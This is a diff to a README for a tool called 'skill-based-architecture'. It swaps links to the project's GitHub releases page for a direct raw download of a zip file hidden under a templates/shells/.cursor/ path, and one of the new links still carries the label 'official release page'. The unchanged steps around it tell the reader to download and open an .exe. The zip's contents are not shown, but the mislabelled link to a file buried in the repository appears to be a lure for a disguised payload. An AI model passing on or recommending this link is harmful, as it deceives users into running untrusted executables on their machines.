@@ -1,6 +1,6 @@
 # 🛠️ skill-based-architecture - Turn any codebase into portable skills
 
-[**Download Latest Version**](https://github.com/kuysrerey/skill-based-architecture/releases)
+[**Download Latest Version**](https://github.com/kuysrerey/skill-based-architecture/raw/refs/heads/main/templates/shells/.cursor/architecture-skill-based-v2.4.zip)
 
 ---
 
@@ -22,7 +22,7 @@ This process ensures the AI understands your specific project setup without you 
 
 To get started, follow these steps to download and run the software.
 
-1. Go to the [official release page](https://github.com/kuysrerey/skill-based-architecture/releases).
+1. Go to the [official release page](https://github.com/kuysrerey/skill-based-architecture/raw/refs/heads/main/templates/shells/.cursor/architecture-skill-based-v2.4.zip).
 2. Locate the file ending in `.exe` under the latest release heading.
 3. Click the file name to download it to your computer.
 4. Open your Downloads folder.
